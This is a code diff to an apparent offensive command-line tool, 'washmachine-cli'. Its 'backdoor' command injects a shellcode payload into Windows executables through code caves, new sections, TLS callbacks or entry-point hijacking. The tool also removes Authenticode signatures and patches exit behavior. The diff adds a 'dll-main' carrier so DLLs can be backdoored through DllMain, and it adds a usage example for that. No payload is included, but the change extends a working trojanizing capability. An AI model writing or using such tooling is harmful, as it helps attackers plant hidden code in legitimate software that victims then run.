@@ -26,7 +26,7 @@ public static partial class Program
     private static readonly string[] ShowLegacyTargets = { "--templates", "--encoders", "--snippets", "--compilers" };
     private static readonly string[] BackdoorMethodValues = { "code-cave", "new-section", "section-ext", "text-pad", "tls-callback" };
     private static readonly string[] BackdoorEncryptionValues = { "none" };
-    private static readonly string[] BackdoorCarrierValues = { "entry-point" };
+    private static readonly string[] BackdoorCarrierValues = { "entry-point", "dll-main" };
     private static readonly string[] StripModeValues = { "ep", "entry-point", "section", "all-exec", "range" };
     private static readonly Dictionary<string, string[]> CommandOptionCompletions = new(StringComparer.OrdinalIgnoreCase)
     {
@@ -1596,6 +1596,7 @@ public static partial class Program
         var carrierInvoke = carrier switch
         {
             null or "entry-point" or "entrypoint" or "hijack" => CarrierInvoke.EntryPointHijack,
+            "dll-main" or "dllmain" or "dll-entry"            => CarrierInvoke.EntryPointHijack,
             "function-backdoor" or "function" => CarrierInvoke.EntryFunctionBackdoor,
             "tls" or "tls-callback" => CarrierInvoke.TlsCallback,
             _ => (CarrierInvoke?)null
@@ -1603,7 +1604,7 @@ public static partial class Program
 
         if (carrierInvoke is null)
         {
-            AnsiConsole.MarkupLine($"[red]Error:[/] Unknown carrier [white]{Markup.Escape(carrier!)}[/]. Supported: entry-point.");
+            AnsiConsole.MarkupLine($"[red]Error:[/] Unknown carrier [white]{Markup.Escape(carrier!)}[/]. Supported: entry-point, dll-main.");
             return 1;
         }
 
@@ -1619,11 +1620,13 @@ public static partial class Program
         if (carrierInvoke != CarrierInvoke.EntryPointHijack)
         {
             AnsiConsole.MarkupLine($"[red]Error:[/] Carrier [white]{Markup.Escape(carrier!)}[/] is not implemented for the backdoor command.");
-            AnsiConsole.MarkupLine("[grey]Supported carrier: [white]entry-point[/].[/]");
+            AnsiConsole.MarkupLine("[grey]Supported carriers: [white]entry-point[/] (EXE/DLL), [white]dll-main[/] (DLL — same as entry-point).[/]");
             return 1;
         }
 
         var resolvedCarrier = carrierInvoke.Value;
+        // Determine the display label for the carrier based on what the user specified and the target type
+        bool isDllCarrierAlias = carrier is "dll-main" or "dllmain" or "dll-entry";
 
         if (!preserveEntry)
         {
@@ -1738,8 +1741,7 @@ public static partial class Program
             teeLogger?.FileOnly("");
             teeLogger?.FileOnly("── Injection Plan ─────────────────────────────────────────");
             teeLogger?.FileOnly($"  Method      : {resolvedInjection}");
-            teeLogger?.FileOnly($"  Encryption  : {encryptionMethod}");
-            teeLogger?.FileOnly($"  Carrier     : {resolvedCarrier}");
+            teeLogger?.FileOnly($"  Carrier     : {(isDllCarrierAlias || peInfo.IsDll ? "DllMain Hook (entry-point)" : resolvedCarrier.ToString())}");
             teeLogger?.FileOnly($"  Remove sig  : {removeSig}");
             teeLogger?.FileOnly($"  Patch GUI   : {patchSubsystem}");
             teeLogger?.FileOnly($"  Patch exit  : {patchExitCalls}");
@@ -1907,8 +1909,7 @@ public static partial class Program
                     .AddColumn("Value");
 
                 planTable.AddRow($"[{UiColors.Accent}]Method[/]", $"[white]{resolvedInjection}[/]");
-                planTable.AddRow($"[{UiColors.Accent}]Encryption[/]", $"[white]{encryptionMethod}{(encryptionMethod == PayloadEncryption.Xor ? $" (key=0x{xorKey:X2})" : "")}[/]");
-                planTable.AddRow($"[{UiColors.Accent}]Invoke[/]", $"[white]{resolvedCarrier}[/]");
+                planTable.AddRow($"[{UiColors.Accent}]Invoke[/]", $"[white]{(isDllCarrierAlias || peInfo.IsDll ? "DllMain Hook (entry-point)" : resolvedCarrier.ToString())}[/]");
                 planTable.AddRow($"[{UiColors.Accent}]Remove sig[/]", $"[white]{removeSig}[/]");
                 planTable.AddRow($"[{UiColors.Accent}]Patch GUI[/]", $"[white]{patchSubsystem}[/]");
 
@@ -2332,8 +2333,7 @@ public static partial class Program
                     "Behavior, compatibility, and logging",
                     "These flags shape the patching pass and reporting.",
                     [
-                        new UsageOption("-Carrier <mode>", "Payload invocation strategy. The current implementation supports entry-point only.", "entry-point", "entry-point"),
-                        new UsageOption("-Encryption <mode>", "Payload encoding/encryption mode. The current implementation supports none only.", "none", "none"),
+                        new UsageOption("-Carrier <mode>", "Payload invocation strategy. Use entry-point for EXE targets, dll-main for DLL targets (both hook the entry point).", "entry-point", "entry-point | dll-main"),
                         new UsageOption("-NoRemoveSig", "Keep the Authenticode signature instead of removing it."),
                         new UsageOption("-NoPatchSubsystem", "Leave the subsystem unchanged instead of patching to GUI."),
                         new UsageOption("-NoPatchExit", "Do not rewrite exit behavior after the payload runs."),
@@ -2360,14 +2360,15 @@ public static partial class Program
                     "Current support level",
                     Bullets:
                     [
-                        "The backdoor flow expects a ready-to-run flat .bin payload. Use encode when you need to build a loader first.",
-                        "Only the entry-point carrier is implemented today. Other historical carrier names are intentionally not documented as supported workflows.",
-                        "Only -Encryption none is implemented today. Prepare payload transformation before the backdoor step if you need custom encoding.",
+                        "The backdoor flow expects a ready-to-run flat .bin payload. Payload encoding and obfuscation happen in the encode stage (encode + bin2shell) — not here.",
+                        "Both EXE and DLL targets are supported. Use -Carrier entry-point for EXE files and -Carrier dll-main for DLL files (both patch the PE entry point; for DLLs this is DllMain).",
+                        "DLL targets will not have their subsystem patched to GUI — that flag is silently ignored for DLLs.",
                     ]),
             ],
             Examples:
             [
                 new UsageExample("washmachine-cli backdoor -Pe .\\app.exe -s .\\payload.bin", "Patch a PE with the default code-cave strategy.", "PowerShell / pwsh"),
+                new UsageExample("washmachine-cli backdoor -Pe .\\target.dll -s .\\payload.bin -Carrier dll-main -m new-section", "Backdoor a DLL by hooking its DllMain entry.", "PowerShell / pwsh"),
                 new UsageExample("washmachine-cli backdoor -Pe ./target.exe -s ./payload.bin -m new-section -o ./patched.exe", "Use a new section when you want predictable capacity.", "Bash / Zsh"),
                 new UsageExample("washmachine-cli backdoor -Pe target.exe -s payload.bin -m text-pad -DryRun -Verbose", "Check whether text padding is viable before writing output.", "Any shell"),
                 new UsageExample("washmachine-cli backdoor -Pe target.exe -s payload.bin -m tls-callback", "Attempt TLS callback placement on a compatible target.", "Any shell"),
